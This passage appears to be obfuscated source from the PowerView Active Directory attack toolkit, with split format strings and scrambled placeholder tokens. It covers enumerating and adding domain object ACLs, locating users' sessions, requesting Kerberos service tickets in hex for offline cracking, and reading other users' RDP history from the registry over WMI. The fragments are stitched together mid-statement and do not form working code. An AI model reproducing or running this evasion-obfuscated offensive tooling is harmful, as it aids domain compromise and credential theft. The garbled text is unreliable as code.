                                    if (YoV{_}.Z3bnAIJKMeZ3b -match (((Z3b{3}{2}{11}{13}{0}{6}{12}{1}{5}{8}{9}{10}{4}{7}Z3b -f S5znheritedOS5z,S5zctTyS5z,S5zctTypS5z,S5zObjeS5z,S5ztS5z,S5zpS5z,S5zbjS5z,S5zAceTypeS5z,S5zeS5z,S5zXHS5z,S5zOObjectAceTypeXHOInheritedObjecS5z,S5zeS5z,S5zeS5z,S5zXHOIS5z)).Z3bREplaIJKCeZ3b(([chaR]88+[chaR]72+[chaR]79),[sTrinG][chaR]124))) {
                                        try {
                                            YoV{AcLPropIJKeRTiIJKeS}[YoV{_}.Z3bnaIJKMEZ3b] = YoV{guIJKIIJKDS}[YoV{_}.Z3bVaIJKlUeZ3b.(Z3b{0}{1}Z3b -fS5ztS5z,S5zoStringS5z).Invoke()]
                                        }
                                        catch {
                                            YoV{aClIJKpIJKROIJKPeIJKRTIES}[YoV{_}.Z3bnAIJKMEZ3b] = YoV{_}.Z3bvaLIJKUEZ3b
                                        }
                                    }
                                    else {
                                        YoV{AIJKcLpRoPerIJKTies}[YoV{_}.Z3bnIJKAMEZ3b] = YoV{_}.Z3bvALIJKUEZ3b
                                    }
                                }
                                YoV{OUIJKTObIJKJecT} = &(Z3b{0}{1}{2}{3}Z3b-fS5zNewS5z,S5z-ObS5z,S5zjS5z,S5zectS5z) -TypeName (Z3b{0}{1}{2}Z3b-fS5zPSObS5z,S5zjS5z,S5zectS5z) -Property YoV{ACIJKLPIJKRoIJKpErtIIJKEs}
                                YoV{OIJKUToIJKBIJKjecT}.Z3bpsOBJIJKEctZ3b.Z3btyPENIJKAmesZ3b.(Z3b{1}{0}Z3b -f S5zsertS5z,S5zInS5z).Invoke(0, (Z3b{1}{2}{0}{3}Z3b -fS5z.S5z,S5zPowS5z,S5zerViewS5z,S5zACLS5z))
                                YoV{oUtOBIJKjIJKecT}
                            }
                            else {
                                YoV{_}.Z3bPIJKsObJecTZ3b.Z3btypenIJKAIJKMesZ3b.(Z3b{2}{0}{1}Z3b -fS5zsS5z,S5zertS5z,S5zInS5z).Invoke(0, (Z3b{0}{2}{1}Z3b -f S5zPowerVS5z,S5zACLS5z,S5ziew.S5z))
                                YoV{_}
                            }
                        }
                    }
                }
                catch {
                    &(Z3b{1}{0}{4}{2}{3}Z3b-fS5zitS5z,S5zWrS5z,S5zosS5z,S5zeS5z,S5ze-VerbS5z) (S5z[Get-DoS5z+S5zmainS5z+S5zObS5z+S5zjeS5z+S5zcS5z+S5ztAcl] S5z+S5zErS5z+S5zroS5z+S5zr: S5z+Z3bYoV_Z3b)
                }
            }
        }
    }
}


function Add-dOmIJKAiNobJIJKectIJKACL {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{1}{3}{2}{0}Z3b-fS5zocessS5z,S5zPSShS5z,S5zPrS5z,S5zouldS5z}, S5zS5z)]
    [CmdletBinding()]
    Param (
        [Parameter(pOsitiOn = 0, vALUEFroMPIpeline = YoV{tIJKRuE}, valueFRoMpIpelINeBypROpERtYNAME = YoV{TIJKRuE})]
        [Alias({Z3b{4}{1}{2}{3}{0}Z3b-fS5zeS5z,S5zstinguisS5z,S5zhedNaS5z,S5zmS5z,S5zDiS5z}, {Z3b{0}{1}{4}{2}{3}Z3b -f S5zSaS5z,S5zmS5z,S5zcounS5z,S5ztNameS5z,S5zAcS5z}, {Z3b{1}{0}Z3b -f S5zameS5z,S5zNS5z})]
        [String[]]
        YoV{taIJKRIJKGetiDEnIJKTIIJKTY},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{tAIJKRGIJKeTdOmIJKAIJKiN},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{1}{2}{0}Z3b -fS5zerS5z,S5zFilS5z,S5ztS5z})]
        [String]
        YoV{TAIJKRIJKGEIJKTlIJKDaPIJKFIltER},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{tIJKArIJKGEtIJKsIJKEAIJKRChBASe},

        [Parameter(MandAtorY = YoV{TIJKRuE})]
        [ValidateNotNullOrEmpty()]
      ','5zGet-DomS5z) @ComputerSearcherArguments JGO &(Z3b{2}{1}{0}Z3b-f S5ztS5z,S5z-ObjecS5z,S5zSelectS5z) -ExpandProperty (Z3b{2}{0}{3}{1}Z3b-f S5zhS5z,S5znameS5z,S5zdnsS5z,S5zostS5z)
            }
        }
        &(Z3b{1}{2}{0}{3}Z3b -f S5zte-VerbS5z,S5zWS5z,S5zriS5z,S5zoseS5z) Z3b[Find-DomainUserLocation] TargetComputers length: YoV(YoVTargetComputers.Length) Z3b
        if (YoV{TaRGeTIJKCoIJKMIJKPutEIJKRs}.Z3bleIJKNIJKgTHZ3b -eq 0) {
            throw (Z3b{3}{6}{0}{11}{4}{14}{2}{8}{7}{12}{13}{1}{10}{5}{9}Z3b-f S5zomainUserLocS5z,S5zfound to enumS5z,S5z]S5z,S5z[Find-S5z,S5zioS5z,S5ztS5z,S5zDS5z,S5zNo hS5z,S5z S5z,S5zeS5z,S5zeraS5z,S5zatS5z,S5zosS5z,S5zts S5z,S5znS5z)
        }

        
        if (YoV{PsBIJKoIJKUnDPAraMIJKETIJKeRs}[(Z3b{0}{2}{1}Z3b -fS5zCredenS5z,S5zialS5z,S5ztS5z)]) {
            YoV{currENIJKTIJKUSIJKEr} = YoV{CReDEIJKNIJKTIJKIAl}.(Z3b{2}{1}{3}{4}{0}Z3b -fS5ztialS5z,S5ztNeS5z,S5zGeS5z,S5ztworkCredS5z,S5zenS5z).Invoke().Z3busEIJKRIJKNAmeZ3b
        }
        else {
            YoV{cuRRIJKeIJKNtuseR} = ( (  &(Z3b{0}{1}Z3b-f S5zIS5z,S5zTEMS5z) (S5zvARiS5z+S5zAbLES5z+S5z:9tzk1S5z) ).Z3bvIJKALuEZ3b::Z3bUIJKseIJKRNaMEZ3b).(Z3b{0}{1}Z3b-fS5zToLoS5z,S5zwerS5z).Invoke()
        }

        
        if (YoV{PsIJKBouIJKNdpArAmeTEIJKRs}[(Z3b{0}{1}Z3b-fS5zSS5z,S5zhowAllS5z)]) {
            YoV{tarGIJKeIJKTuSERs} = @()
        }
        elseif (YoV{PsboUndIJKParIJKAIJKmIJ','Z3b -fS5z.GPO.S5z,S5zPowS5z,S5zRawS5z,S5zerViewS5z})]
    [CmdletBinding(DEfaUlTParAMETERseTnAME = {Z3b{1}{0}Z3b-fS5zoneS5z,S5zNS5z})]
    Param(
        [Parameter(poSITIon = 0, VaLUEfRoMpIPELIne = YoV{TIJKRUE}, valUEfROMpipELinEbYpRoPErtyNaMe = YoV{TrIJKUe})]
        [Alias({Z3b{1}{2}{3}{0}Z3b -fS5zNameS5z,S5zDS5z,S5zistinguS5z,S5zishedS5z}, {Z3b{1}{0}{2}Z3b-f S5zmAcS5z,S5zSaS5z,S5zcountNameS5z}, {Z3b{0}{1}Z3b-f S5zNaS5z,S5zmeS5z})]
        [String[]]
        YoV{IDIJKENTIJKITy},

        [Parameter(ParaMEterSetName = Z3bcOIJKMPUTERIdIJKenIJKTIIJKTYZ3b)]
        [Alias({Z3b{0}{2}{1}{3}Z3b -f S5zComS5z,S5zeS5z,S5zputS5z,S5zrNameS5z})]
        [ValidateNotNullOrEmpty()]
        [String]
        YoV{ComPUteRIJKiIJKdenTIIJKTy},

        [Parameter(ParAMEterSEtnAME = Z3buSEIJKRIJKiDentIIJKTYZ3b)]
        [Alias({Z3b{2}{0}{1}Z3b -fS5zsS5z,S5zerNameS5z,S5zUS5z})]
        [ValidateNotNullOrEmpty()]
        [String]
        YoV{UIJKSERIJKIdEntIJKIty},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{dIJKoMIJKAIN},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{0}{1}{2}Z3b -fS5zFilS5z,S5zteS5z,S5zrS5z})]
        [String]
        YoV{LDaIJKpfIJKILtEr},

        [ValidateNotNullOrEmpty()]
        [String[]]
        YoV{pRoPIJKeIJKRtIJKieS},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{0}{1}{2}Z3b -f S5zAS5z,S5zDS5z,S5zSPathS5z})]
        [String]
        YoV{SEAIJKRChIJKBAse},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{2}{3}{0}{4}{1}Z3b -fS5zinContS5z,S5zrS5z,S5zDS5z,S5zomaS5z,S5zrolleS5z})]
        [String]
        YoV{sIJKeIJKRVER},

        [ValidateSet({Z3b{0}{1}Z3b-fS5zBS5z,S5zaseS5z}, {Z3b{1}{2}{0}Z3b-fS5zelS5z,S5zOS',' (Z3b{1','       if (YoV{tIJKICIJKKET}) {
                YoV{tICIJKkeTbyteIJKStrIJKeAM} = YoV{TIcIJKkIJKET}.(Z3b{3}{0}{2}{1}Z3b -f S5ztRequS5z,S5zstS5z,S5zeS5z,S5zGeS5z).Invoke()
            }
            if (YoV{tIJKICKEtbYTIJKEIJKStRIJKEAm}) {
                YoV{oIJKUT} = &(Z3b{1}{2}{0}Z3b-f S5zctS5z,S5zNew-OS5z,S5zbjeS5z) (Z3b{0}{1}{2}Z3b-f S5zPSObS5z,S5zjeS5z,S5zctS5z)

                YoV{tIcketIJKhEXstreIJKAm} =   YoV{6qIJKNl}::(Z3b{1}{2}{0}Z3b-fS5ztringS5z,S5zTS5z,S5zoSS5z).Invoke(YoV{ticIJKKeIJKTbytEIJKstrEAM}) -replace S5z-S5z

                YoV{OIJKUt} JGO &(Z3b{1}{2}{0}Z3b-fS5zMemberS5z,S5zAS5z,S5zdd-S5z) (Z3b{3}{2}{0}{1}Z3b -fS5zoperS5z,S5ztyS5z,S5zrS5z,S5zNotepS5z) (Z3b{0}{2}{3}{1}Z3b-fS5zSS5z,S5zeS5z,S5zamAcS5z,S5zcountNamS5z) YoV{sAmIJKAcCOIJKUIJKNtNIJKAmE}
                YoV{OIJKUT} JGO &(Z3b{3}{2}{1}{0}Z3b -f S5zmberS5z,S5zMeS5z,S5zdd-S5z,S5zAS5z) (Z3b{2}{1}{3}{0}Z3','5z,S5z-S5z,S5zs forS5z,S5znS5z)

            if (YoV{PSbOuIJKNIJKDPIJKArIJKAmETErS}[(Z3b{1}{0}Z3b-fS5zainS5z,S5zDomS5z)]) {
                YoV{taRIJKGeTIJKdOMain} = YoV{doIJKMain}
            }
            else {
                
                YoV{tarIJKgIJKETDoMAiN} = YoV{CRedeIJKNtIIJKAl}.(Z3b{1}{2}{4}{3}{0}Z3b-f S5zedentialS5z,S5zGetNS5z,S5zetwS5z,S5zrkCrS5z,S5zoS5z).Invoke().Z3bdoIJKmAIJKINZ3b
                &(Z3b{0}{2}{1}Z3b -fS5zWrite-VerS5z,S5zeS5z,S5zbosS5z) (S5z[GetS5z+S5z-DomaS5z+S5zin] S5z+S5zES5z+S5zxtraS5z+S5zcted S5z+S5zdoS5z+S5zmain S5z+Z3bS5zYoVTargetDomainS5z Z3b+S5zfromS5z+S5z S5z+S5z-CreS5z+S5zdeS5z+S5zntS5z+S5zialS5z)
            }

            YoV{dIJKOIJKmaINCONtIJKEXt} = &(Z3b{0}{2}{1}{3}Z3b-fS5zNeS5z,S5zeS5z,S5zw-ObjS5z,S5zctS5z) (Z3b{0}{6}{10}{5}{4}{8}{7}{2}{3}{1}{11}{9}Z3b-f S5zSysteS5z,S5zContS5z,S5zctory.DiS5z,S5zrectoryS5z,S5zySS5z,S5zrectorS5z,S5zmS5z,S5ztiveDireS5z,S5zervices.AcS5z,S5zxtS5z,S5z.DiS5z,S5zeS5z)((Z3b{1}{0}Z3b -f S5zomainS5z,S5zDS5z), YoV{tarIJKgeTDomIJKAIN}, YoV{cIJKReIJKDeNtiAl}.Z3bUsEIJKRNIJKAMEZ3b, YoV{crEIJKdEIJKNtiAl}.(Z3b{0}{3}{2}{1}{4}Z3b -fS5zGetNetS5z,S5zentiS5z,S5zdS5z,S5zworkCreS5z,S5zalS5z).Invoke().Z3bpIJKAsSWIJKoRDZ3b)

            try {
                 (&(Z3b{2}{0}{1}Z3b -f S5ziaBS5z,S5zLeS5z,S5zvARS5z)  (S5zu1X0S5z+S5zWS5z+S5zVS5z) -ValUeo)::(Z3b{0}{1}Z3b-f S5zGetDomaS5z,S5zinS5z).Invoke(YoV{dOMaiIJKNCOnIJKTexT})
            }
            catch {
                &(Z3b{2}{0}{1}Z3b -fS5zte-VS5z,S5zerboseS5z,S5zWriS5z) (S5z[Get-DomS5z+S5zaS5z+S5zin] S5z+S5zThS5z+S5ze S5z+S5zsS5z+S5zpS5z+S5zecifiS5z+S5zed S5z+S5zdomainS5z+S5z S5z+Z3bS5zYoVTargetDomainS5z Z3b+S5zdoS5z+S5zes S5z+S5znS5z+S5zot S5z+S5zexiS5z+S5zst, S5z+S5zcS5z+S5zould S5z+S5znoS5z+S5zt S5z+S5zbS5z+S5ze S5z+S5zcontacS5z+S5zteS5z+S5zd, S5z+S5zthS5z+S5zerS5z+S5ze S5z+(S5zisnS5z+S5zhYpt S5z).Z3bRePIJKlAcEZ3b(S5zhYpS5z,[StrINg][cHAR]39)+S5zanS5z+S5z S5z+S5zexS5z+S5zisting S5z+S5ztS5z+S5zrusS5z+S5zt, S5z+S5zoS5z+S5zr S5z+S5ztS5z+S5zhe S5z+S5zspS5z+S5zecifiS5z+S5zeS5z+S5zd S5z+S5zcredentS5z+S5ziaS5z+S5zlS5z+S5zs S5z+S5zareS5z+S5z S5z+S5zinvalS5z+S5zid:S5z+S5z S5z+Z3bYoV_Z3b)
            }
        }
        elseif (YoV{psBIJKOIJKUnDpArAIJKMETIJKErS}[(Z3b{1}{0}Z3b-fS5zainS5z,S5zDomS5z)]) {
            YoV{DOIJKmIJKAiIJKNconTEIJKXT} = &(Z3b{0}{2}{1}Z3b -fS5zNS5z,S5ztS5z,S5zew-ObjecS5z) (Z3b{1}{2}{8}{0}{7}{9}{4}{5}{6}{10}{3}Z3b-f S5zces.ActiS5z,S5zSystem.DiS5z,S5zrectorySS5z,S5zctoryContextS5z,S5zyS5z,S5z.DS5z,S5zirS5z,S5zveDS5z,S5zerviS5z,S5zirectorS5z,S5zeS5z)((Z3b{1}{0}Z3b -f S5zmainS5z,S5zDoS5z), YoV{dOIJKMAin})
            try {
                 ( &(Z3b{1}{2}{0}Z3b -f S5ziaBleS5z,S5zVAS5z,S5zrS5z) (Z3buZ3b+Z3b1X0WvZ3b) -vaLuEon )::(Z','           YoV{eIJKNd} = YoV{CoIJKmIJKPuTIJKERIJKNAME}.Z3blenIJKGIJKTHZ3b
            }
            YoV{lIJKiSt}.Z3bADIJKdRAIJKNgEZ3b(YoV{CoIJKmpIJKUIJKTErnIJKAmE}[YoV{sIJKTAIJKRt}..(YoV{EIJKNd}-1)])
            YoV{SIJKTART} += YoV{eLeIJKmIJKENTspLiTsIJKizE}
            YoV{eIJKND} += YoV{elemeNTsIJKPlIJKIIJKTsIJKiZe}
            YoV{COmIJKpUIJKTERNAIJKmIJKepartitiONIJKeD} += @(,@(YoV{lIJKIST}.(Z3b{1}{2}{0}Z3b -fS5zayS5z,S5zToArS5z,S5zrS5z).Invoke()))
        }

        &(Z3b{2}{1}{3}{4}{0}Z3b-f S5zoseS5z,S5zte-S5z,S5zWriS5z,S5zVeS5z,S5zrbS5z) (S5z[NS5z+S5zew-ThrS5z+S5zeadS5z+S5zedS5z+S5zFunS5z+S5zcS5z+S5ztionS5z+S5z] S5z+S5zTotaS5z+S5zl S5z+S5znS5z+S5zuS5z+S5zmber S5z+S5zofS5z+S5z S5z+S5zthrS5z+S5zeS5z+S5zads/partitions:S5z+S5z S5z+Z3bYoVThreadsZ3b)

        ForEach (YoV{COMPUteRIJKNAIJKMEpArIJKTIJKitIJKiOn} in YoV{COmputErNaIJKMeIJKpArTITIJKiIJKonIJKed}) {
            
            YoV{pOIJKWERsIJKHeLL} =  ( &(Z3b{1}{0}Z3b -f S5zableS5z,S5zVariS5z) U0j  ).Z3bvaIJKLUEZ3b::(Z3b{0}{1}Z3b-fS5zCreS5z,S5zateS5z).Invoke()
            YoV{powIJKERsHeIJKlL}.Z3brIJKUIJKNIJKsPAcEPOOlZ3b = YoV{PIJKoOl}

            
            YoV{NUIJKlL} = YoV{pOwIJKERsIJKhIJKEll}.(Z3b{1}{0}{2}Z3b -fS5ziS5z,S5zAddScrS5z,S5zptS5z).Invoke(YoV{ScrIJKiIJKPTBLoIJKck}).(Z3b{3}{1}{2}{0}Z3b -fS5zerS5z,S5zParS5z,S5zametS5z,S5zAddS5z).Invoke((Z3b{0}{1}{2}Z3b-fS5zComputerS5z,S5zNaS5z,S5zmeS5z), YoV{COMPuTIJKERNIJKAmIJKePArTIIJKT','S5zSYSS5z) )  ; &(Z3b{2}{1}{0}Z3b-f S5zES5z,S5zt-VarIAbLS5z,S5zsES5z) (S5zZS5z+S5zLu9S5z)  (  [type](Z3b{4}{0}{5}{6}{2}{3}{1}Z3b -F S5zstES5z,S5zSS5z,S5zgSS5z,S5z','5z) YoV{_}.Z3boIJKBJeIJKCtAcetyIJKpEZ3b
                        }
                        else {
                            YoV{iIJKNtErIJKEsTIJKiIJKNGACl} JGO &(Z3b{3}{1}{2}{0}Z3b-f S5zmberS5z,S5z-MS5z,S5zeS5z,S5zAddS5z) (Z3b{2}{1}{0}Z3b -f S5ztyS5z,S5zroperS5z,S5zNotePS5z) (Z3b{2}{0}{1}Z3b -fS5zbjectAceS5z,S5zTypeS5z,S5zOS5z) (Z3b{1}{0}Z3b -fS5zoneS5z,S5zNS5z)
                        }
                        YoV{iNTErIJKeIJKSTiIJKNgACl} JGO &(Z3b{0}{2}{1}Z3b -f S5zAdd-S5z,S5zberS5z,S5zMemS5z) (Z3b{1}{0}{2}{3}Z3b -fS5zroperS5z,S5zNotePS5z,S5ztS5z,S5zyS5z) (Z3b{0}{1}Z3b-f S5zAceFlS5z,S5zagsS5z) YoV{_}.Z3bacIJKEIJKFlAgSZ3b
                        YoV{INtEr','               YoV{oIJKBJEIJKCTDN} = YoV{cIJKOMIJKPIJKUter}.Z3bdiIJKSTIJKINguIsheIJKdIJKNAMEZ3b
                    YoV{TIJKARIJKGEtcOMpIJKUIJKTeIJKRIJKNAME} = YoV{coIJKmpUIJKTer}.Z3bDnsIJKhostIJKNIJKAmEZ3b
                }
                else {
                    YoV{sEArchEIJKRaIJKRIJKGIJKUMIJKeNTs}[(Z3b{0}{2}{1}Z3b -fS5zIdentiS5z,S5zyS5z,S5ztS5z)] = YoV{UseriIJKDeNIJKTITY}
                    YoV{USIJKeR} = &(Z3b{0}{3}{2}{1}Z3b-f S5zGeS5z,S5zrS5z,S5zainUseS5z,S5zt-DomS5z) @SearcherArguments -FindOne JGO &(Z3b{4}{2}{0}{3}{1}Z3b -fS5zOS5z,S5ztS5z,S5zelect-S5z,S5zbjecS5z,S5zSS5z) -First 1
                    if(-not YoV{UsIJKer}) {
                        &(Z3b{2}{1}{0}Z3b -f S5zoseS5z,S5zite-VerbS5z,S5zWrS5z) (S5z[Get-DS5z+S5zoS5z+S5zmainGPO] S5z+S5zUS5z+S5zser S5z+Z3bS5zYoVUserIdentityS5z Z3b+S5znS5z+S5zot S5z+S5zfouS5z+','bS5z,S5zcS5z,S5zEaS5z,S5zjectS5z) {

            if ( (YoV{_}.Z3bAcTIJKiVeDIrectIJKoRIJKyRiGhIJKTSZ3b -match (((Z3b{7}{11}{0}{4}{10}{9}{8}{6}{5}{1}{3}{2}Z3b-fS5zlDhS5z,S5zeDhS5z,S5zleteS5z,S5zLDeS5z,S5zLWS5z,S5zCreatS5z,S5zLS5z,S5zGenericS5z,S5zDhS5z,S5zeS5z,S5zritS5z,S5zAlS5z)) -CrePlaCe  S5zDhLS5z,[CHaR]124)) -or ((YoV{_}.Z3baCIJKTIVeDIJKirIJKEcTORYrIgHTSZ3b -match (Z3b{2}{0}{1}Z3b-f S5ztS5z,S5zendedRightS5z,S5zExS5z)) -and (YoV{_}.Z3bacEIJKqUalifiIJKerZ3b -match (Z3b{0}{1}Z3b-f S5zAllS5z,S5zowS5z)))) {
                
                if (YoV{_}.Z3bSECUrIJKITYIJKIdeNTIJKIFIErZ3b.Z3bVIJKAlUeZ3b -match S5z^S-1-5-.*-[1-9]5rjd{3,}YoVS5z) {
                    if (YoV{RIJKeIJKSoLIJKVEDIJKsidS}[YoV{_}.Z3bSEIJKcUriIJKTIJKyIdEnTIFIerZ3b.Z3bvaLIJKUEZ3b]) {
                        YoV{IdenTiTYREFerenIJKCIJKeIJKNIJKAme}, YoV{ideNIJKTityRefEIJKRIJKenCEDOIJKMAin}, YoV{IdeIJKNtiTyIJKREFIJKeIJKREncEDN}, YoV{idIJKEntItyreIJKFIJKerenIJKcIJKecLASS} = YoV{rEsOIJKLIJKVeIJKDIJKSIds}[YoV{_}.Z3bsEcIJKURIIJKTYiDIJKENtifIIJKeRZ3b.Z3bVIJKALueZ3b]

                        YoV{interestIJKiIJKNgaIJKCL} = &(Z3b{2}{1}{3}{0}Z3b-fS5zctS5z,S5zOS5z,S5zNew-S5z,S5zbjeS5z) (Z3b{1}{2}{0}Z3b-fS5zctS5z,S5zPSOS5z,S5zbjeS5z)
                        YoV{IntEReIJKsTiIJKNIJKgaCl} JGO &(Z3b{1}{2}{0}Z3b-fS5zd-MemberS5z,S5zAS5z,S5zdS5z) (Z3b{2}{0}{1}{3}Z3b -f S5zropS5z,S5zerS5z,S5zNotePS5z,S5ztyS5z) (Z3b{1}{2}{0}Z3b-f S5ztDNS5z,S5zObjeS5z,S5zcS5z) YoV{_}.Z3bObJECTIJKDNZ3b
                        YoV{iIJKNIJKTerEIJKstingAIJKcL} JGO &(Z3b{0}{2}{1}Z3b -fS5zAddS5z,S5zrS5z,S5z-MembeS5z) (Z3b{2}{1}{0}Z3b -fS5zertyS5z,S5zopS5z,S5zNotePrS5z) (Z3b{3}{0}{1}{2}Z3b -fS5zalS5z,S5zifiS5z,S5zerS5z,S5zAceQuS5z) YoV{_}.Z3baIJKcequAIJKLIfIJKieRZ3b
                        YoV{INTIJKEIJKREsTINIJKgIJKACl} JGO &(Z3b{1}{0}{2}Z3b-f S5zbS5z,S5zAdd-MemS5z,S5zerS5z) (Z3b{3}{2}{1}{0}Z3b-f S5ztyS5z,S5zperS5z,S5zoS5z,S5zNotePrS5z) (Z3b{0}{5}{3}{4}{2}{1}{6}Z3b -f S5zAcS5z,S5zRiS5z,S5ztoryS5z,S5zDiS5z,S5zrecS5z,S5ztiveS5z,S5zghtsS5z) YoV{_}.Z3baCtIIJKVIJKEDiRECToRIJKyRIJKIgHtSZ3b
                        if (YoV{_}.Z3boBIJKJeCIJKTaCIJKeTypEZ3b) {
                            YoV{inIJKTEreIJKsTIJKiNgacl} JGO &(Z3b{1}{2}{0}Z3b-f S5zMemberS5z,S5zAdS5z,S5zd-S5z) (Z3b{2}{0}{1}Z3b-f S5ztS5z,S5zyS5z,S5zNoteProperS5z) (Z3b{2}{0}{1}Z3b-f S5ztAceTypS5z,S5zeS5z,S5zObjecS','KAL} }

                YoV{rEGPRoIJKViIJKdeR} = &(Z3b{1}{0}{2}Z3b -fS5zmiObjeS5z,S5zGet-WS5z,S5zctS5z) @WmiArguments
                YoV{kIJKEy} = (((Z3b{4}{3}{10}{12}{11}{5}{14}{16}{2}{6}{13}{0}{8}{1}{15}{9}{7}Z3b -fS5zsionS5z,S5zernS5z,S5zrenS5z,S5zWS5z,S5zSOFTS5z,S5zWiS5z,S5ztVS5z,S5z SettingsS5z,S5zCUYIntS5z,S5ztS5z,S5zARECS5z,S5zrosoftCUYS5z,S5zUYMicS5z,S5zerS5z,S5zndowS5z,S5zeS5z,S5zsCUYCurS5z)).(Z3b{2}{0}{1}Z3b-fS5zAS5z,S5zCES5z,S5zREPLS5z).Invoke(S5zCUYS5z,S5z5rjS5z))

                
                YoV{hIJKKCu} = 2147483649
                YoV{PIJKRoxIJKYIJKseRVER} = YoV{REIJKGIJKpRoIJKVIDER}.(Z3b{2}{1}{0}Z3b -f S5ztringValueS5z,S5zetSS5z,S5zGS5z).Invoke(YoV{HIJKKcU}, YoV{kIJKEY}, (Z3b{2}{0}{1}{3}Z3b-fS5zoxyS5z,S5zServeS5z,S5zPrS5z,S5zrS5z)).Z3bsIJKVAluEZ3b
                YoV{AuToCIJKOnIJKFIGUIJKRl} = YoV{rIJKegpIJKRovIIJKDeR}.(Z3b{2}{1}{3}{0}Z3b -f S5zlueS5z,S5zetStringS5z,S5zGS5z,S5zVaS5z).Invoke(YoV{hIJKKCu}, YoV','lse {
                    YoV{idenIJKTItyFIJKiltER} += Z3b(JGO(samAccountName=YoVIdentityInstance)(name=YoVIdentityInstance)(displayname=YoVIdentityInstance))Z3b
                }
            }
            if (YoV{idIJKENtiTIJKyFIJKiLTER} -and (YoV{identitYIJKFiLIJKTeR}.(Z3b{1}{0}Z3b -f S5zimS5z,S5zTrS5z).Invoke() -ne S5zS5z) ) {
                YoV{FIlIJKTeR} += Z3b(JGOYoVIdentityFilter)Z3b
            }

            if (YoV{psbOIJKUNDIJKpIJKArAmIJKEters}[(Z3b{0}{1}{2}Z3b-fS5zLDAS5z,S5zPFiS5z,S5zlterS5z)]) {
                &(Z3b{1}{2}{0}Z3b -f S5zeS5z,S5zWrite-VerbS5z,S5zosS5z) (S5z[S5z+S5zGet-DomainObjecS5z+S5ztS5z+S5zAS5z+S5zcS5z+S5zl]S5z+S5z S5z+S5zUS5z+S5zsing S5z+S5zaddiS5z+S5ztS5z+S5ziS5z+S5zonal S5z+S5zLS5z+S5zDAP S5z+S5zfilS5z+S5zter: S5z+Z3bYoVLDAPFilterZ3b)
                YoV{FIJKIIJKLTer} += Z3bYoVLDAPFilterZ3b
            }

            if (YoV{fIIJKltIJKeR}) {
                YoV{sIJKeArIJKcHer}.Z3bFIJKiIJKLtErZ3b = Z3b(&YoVFilter)Z3b
            }
            &(Z3b{0}{4}{1}{3}{2}Z3b -f S5zWritS5z,S5zVeS5z,S5zseS5z,S5zrboS5z,S5ze-S5z) Z3b[Get-DomainObjectAcl] Get-DomainObjectAcl filter string: YoV(YoVSearcher.filter) Z3b

            YoV{rIJKeSIJKULTs} = YoV{sIJKeARCIJKHer}.(Z3b{1}{0}','
                ForEach (YoV{UseIJKRsId} in YoV{usIJKEIJKRsidS}) {
                    try {
                        if (YoV{pIJKsBouNDIJKPAIJKRAmIJKEters}[(Z3b{2}{1}{0}Z3b-f S5zedentialS5z,S5zrS5z,S5zCS5z)]) {
                            YoV{usEIJKRNIJKAMe} = &(Z3b{3}{1}{0}{2}{4}Z3b -fS5ztS5z,S5zverS5z,S5zFS5z,S5zConS5z,S5zrom-SIDS5z) -ObjectSid YoV{usIJKERIJKsId} -Credential YoV{cRIJKeIJKDenTIAl}
                        }
                        else {
                            YoV{UIJKSErNAIJKMe} = &(Z3b{1}{3}{2}{0}Z3b-f S5zIDS5z,S5zCS5z,S5zm-SS5z,S5zonvertFroS5z) -ObjectSid YoV{UIJKSeRsIJKID}
                        }

                        
                        YoV{coNNeIJKcTIJKIONIJKkeYS} = YoV{RIJKEg}.(Z3b{0}{2}{1}Z3b -fS5zEnS5z,S5zaluesS5z,S5zumVS5z).Invoke(YoV{hIJKkU},(Z3bYoVUserSID5rjSoftware5rjMicrosoft5rjTerminal Z3b+S5zServS5z+S5zer S5z+(S5zCS5z+S5zlieS5z+S5znt{0}DS5z+S5zefS5z+S5zaultS5z) -F[chaR]92)).Z3bSIJKNIJKAMesZ3b

                        ForEach (YoV{ConIJKNIJKectIJKiOn} in YoV{CoIJKNnectiIJKOnkeys}) {
                            
                            if (YoV{coNnEcIJKTIIJKoN} -match (Z3b{0}{1}Z3b -fS5zMRU.S5z,S5z*S5z)) {
                                YoV{taRGEIJKTsEIJKRvER} = YoV{RIJKEg}.(Z3b{3}{0}{1}{2}Z3b-fS5zetSS5z,S5ztringS5z,S5zValueS5z,S5zGS5z).Invoke(YoV{HIJKKu}, (Z3bYoVUserSID5rjSoftware5rjMicrosoft5rjTerminal Z3b+S5zSS5z+S5zerver S5z+(S5zCS5z+S5zlienS5z+S5zt{S5z+S5z0}DefauS5z+S5zltS5z) -F [cHAr]92), YoV{cIJKOnnEIJKcTION}).Z3bSIJKValUEZ3b

                                YoV{foIJKUNDIJKcIJKoNnECtIon} = &(Z3b{0}{2}{1}Z3b-fS5zNewS5z,S5zbjectS5z,S5z-OS5z) (Z3b{0}{1}Z3b -f S5zPSS5z,S5zObjectS5z)
                                YoV{fOUNDIJKcIJKoNIJKNECtION} JGO &(Z3b{2}{0}{1}Z3b-f S5zdd-MS5z,S5zemberS5z,S5zAS5z) (Z3b{2}{0}{1}{3}Z3b -f S5zrS5z,S5zoS5z,S5zNotepS5z,S5zpertyS5z) (Z3b{1}{0}{2}Z3b -f S5zmputerNaS5z,S5zCoS5z,S5zmeS5z) YoV{CIJKoIJKmPUTER}
                                YoV{FouIJKNIJKdConIJKNEctIon} JGO &(Z3b{2}{1}{0}Z3b -fS5zMemberS5z,S5zd-S5z,S5zAdS5z) (Z3b{2}{3}{0}{1}Z3b-fS5zopeS5z,S5zrtyS5z,S5zNotepS5z,S5zrS5z) (Z3b{1}{2}{0}Z3b-f S5zNameS5z,S5zUsS5z,S5zerS5z) YoV{USEIJKRnaME}
                                YoV{FouIJKNdcONNeIJKCIJKTiIJKoN} JGO &(Z3b{1}{3}{0}{2}Z3b -f S5zMembeS5z,S5zAS5z,S5zrS5z,S5zdd-S5z) (Z3b{1}{3}{2}{0}Z3b -f S5zyS5z,S5zNotS5z,S5zertS5z,S5zepropS5z) (Z3b{1}{2}{0}Z3b-fS5zDS5z,S5zUserS5z,S5zSIS5z) YoV{useRIJKsIJKiD}
